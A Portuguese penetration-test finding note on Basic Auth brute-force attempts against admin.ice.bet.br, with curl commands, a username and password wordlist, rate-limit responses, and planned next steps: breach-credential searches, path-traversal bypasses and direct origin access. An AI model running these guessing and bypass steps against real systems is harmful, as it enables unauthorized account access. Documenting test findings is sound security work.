# F-004 Admin Basic Auth — Brute Force Rate Limited (429)
**Alvo:** `admin.ice.bet.br`
**Severidade:** Info (Rate limit impede brute force)
**Timestamp:** 2026-09-03T06:54:00Z

## Reprodução
```bash
# Teste básico
curl -s -D- -u "admin:admin" https://admin.ice.bet.br/
# HTTP 401 - www-authenticate: Basic realm="Login"

# Após ~5 tentativas bem-sucedidas, todas subsequentes retornam:
# HTTP 429 - Too Many Requests
```

### Credenciais testadas
```bash
# Usuários: admin, Admin, administrator, root, icebet, oig, daniel, danielpiaui, suporte, operador
# Senhas: admin, 123456, 12345678, password, admin123, icebet, icebet2025, oig, P@ssw0rd, 
#          Admin123, changeme, qwerty, letmein, welcome, monkey, 1234567890, 1234567, 123123,
#          Abc123, abc123, 123456789a, 000000, 1234, senha
```

### Todos retornaram:
```bash
HTTP/2 401  # (ou 429 após rate limit)
www-authenticate: Basic realm="Login"
x-cache: Error from cloudfront
via: 1.1 ...cloudfront.net (CloudFront)
```

### CloudFront Origin Header
```
x-amz-cf-pop: GRU1-P5
x-amz-cf-id: 6WAiSDhdjbSVfKnnaNwur_meDI7KoGErO5hrX_7mqER-Lq5612WvUw==
```

## Interpretação
- **CloudFront Basic Auth** configurado na origem AWS (não é do Cloudflare)
- **Rate limit acionado após ~20 tentativas** (CloudFront + Cloudflare)
- Nenhuma credencial default/common funcionou
- O rate limit impede brute force efetivo
- A presença de `x-cache: Error from cloudfront` indica que a origem rejeitou a autenticação

## Impacto
- Baixo — o rate limit protege contra brute force de senha
- Porém, se houver vazamento de credenciais (ex: GitHub, breach), o acesso é imediato

## Próximo passo
- Pesquisar credenciais vazadas do domínio ice.bet.br em breaches
- Verificar se há bypass via CloudFront path traversal (`//admin.ice.bet.br/`, `/admin%00`)
- Tentar acesso via IP direto da origem CloudFront